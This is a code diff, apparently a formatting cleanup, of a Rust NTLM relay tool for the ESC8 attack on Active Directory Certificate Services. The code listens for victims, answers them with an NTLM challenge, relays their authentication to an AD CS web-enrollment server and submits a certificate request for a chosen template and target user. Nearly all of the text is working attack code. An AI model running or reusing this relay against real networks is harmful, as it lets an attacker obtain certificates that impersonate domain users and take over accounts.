@@ -57,9 +57,9 @@ impl AdcsRelay {
         }
 
         let listen_addr = format!("{}:80", self.config.listen_ip);
-        let listener = TcpListener::bind(&listen_addr).await.map_err(|e| {
-            RelayError::Socket(format!("Failed to bind to {}: {}", listen_addr, e))
-        })?;
+        let listener = TcpListener::bind(&listen_addr)
+            .await
+            .map_err(|e| RelayError::Socket(format!("Failed to bind to {}: {}", listen_addr, e)))?;
 
         info!("ESC8 HTTP Relay listening on {}", listen_addr);
         info!(
@@ -69,10 +69,10 @@ impl AdcsRelay {
 
         self.running.store(true, Ordering::SeqCst);
 
-        let running     = Arc::clone(&self.running);
+        let running = Arc::clone(&self.running);
         let target_host = self.config.target_host.clone();
-        let template    = self.config.template.clone();
-        let target_upn  = self.config.target_upn.clone();
+        let template = self.config.template.clone();
+        let target_upn = self.config.target_upn.clone();
 
         let handle = tokio::spawn(async move {
             loop {
@@ -82,7 +82,7 @@ impl AdcsRelay {
                 match listener.accept().await {
                     Ok((stream, peer)) => {
                         info!("ESC8: connection from {}", peer);
-                        let t   = target_host.clone();
+                        let t = target_host.clone();
                         let tpl = template.clone();
                         let upn = target_upn.clone();
                         tokio::spawn(async move {
@@ -132,10 +132,11 @@ async fn handle_client(
 
     let auth_header = extract_ntlm_header(&req);
 
-    let negotiate_header: String = if auth_header.is_none() {
+    let negotiate_header: String = if let Some(hdr) = auth_header {
+        hdr.to_owned()
+    } else {
         // Step 1 — return 401 to trigger NTLM negotiate
-        let challenge_resp =
-            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n";
+        let challenge_resp = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n";
         timed_write(&mut client, challenge_resp.as_bytes()).await?;
 
         let n2 = timed_read(&mut client, &mut buf).await?;
@@ -143,12 +144,16 @@ async fn handle_client(
         extract_ntlm_header(&req2)
             .ok_or_else(|| RelayError::Protocol("Victim did not send NTLM Negotiate".into()))?
             .to_owned()
-    } else {
-        auth_header.unwrap().to_owned()
     };
 
-    process_ntlm_relay(&mut client, &negotiate_header, &target_host, &template, target_upn)
-        .await
+    process_ntlm_relay(
+        &mut client,
+        &negotiate_header,
+        &target_host,
+        &template,
+        target_upn,
+    )
+    .await
 }
 
 /// Perform the 3-message NTLM relay and submit a CSR on success.
@@ -163,13 +168,10 @@ async fn process_ntlm_relay(
 
     // ── Connect to ADCS target ──────────────────────────────
     let target_addr = format!("{}:80", target_host);
-    let mut target = tokio::time::timeout(
-        IO_TIMEOUT,
-        TcpStream::connect(&target_addr),
-    )
-    .await
-    .map_err(|_| RelayError::Network(format!("Timeout connecting to {}", target_addr)))?
-    .map_err(|e| RelayError::Network(e.to_string()))?;
+    let mut target = tokio::time::timeout(IO_TIMEOUT, TcpStream::connect(&target_addr))
+        .await
+        .map_err(|_| RelayError::Network(format!("Timeout connecting to {}", target_addr)))?
+        .map_err(|e| RelayError::Network(e.to_string()))?;
 
     let mut buf = vec![0u8; BUF];
 
@@ -226,7 +228,7 @@ async fn process_ntlm_relay(
     let _ = timed_write(client, done.as_bytes()).await;
 
     // ── POST CSR on authenticated connection ───────────────
-    let csr  = build_csr(target_upn.as_deref());
+    let csr = build_csr(target_upn.as_deref());
     let body = format!(
         "Mode=newreq&CertRequest={}&CertAttrib=CertificateTemplate:{}&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=",
         url_encode(&csr),
@@ -317,7 +319,7 @@ fn url_encode(input: &str) -> String {
 }
 
 /// Find the first `Authorization: NTLM ...` header line (case-insensitive).
-fn extract_ntlm_header<'a>(request: &'a str) -> Option<&'a str> {
+fn extract_ntlm_header(request: &str) -> Option<&str> {
     request
         .lines()
         .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
@@ -327,8 +329,12 @@ fn extract_ntlm_header<'a>(request: &'a str) -> Option<&'a str> {
 /// (case-insensitive) and return only the Base64 blob.
 fn strip_ntlm_prefix(header: &str) -> &str {
     let h = header.trim();
-    for prefix in &["Authorization: NTLM ", "authorization: ntlm ",
-                     "WWW-Authenticate: NTLM ", "www-authenticate: ntlm "] {
+    for prefix in &[
+        "Authorization: NTLM ",
+        "authorization: ntlm ",
+        "WWW-Authenticate: NTLM ",
+        "www-authenticate: ntlm ",
+    ] {
         if h.to_lowercase().starts_with(&prefix.to_lowercase()) {
             return &h[prefix.len()..];
         }
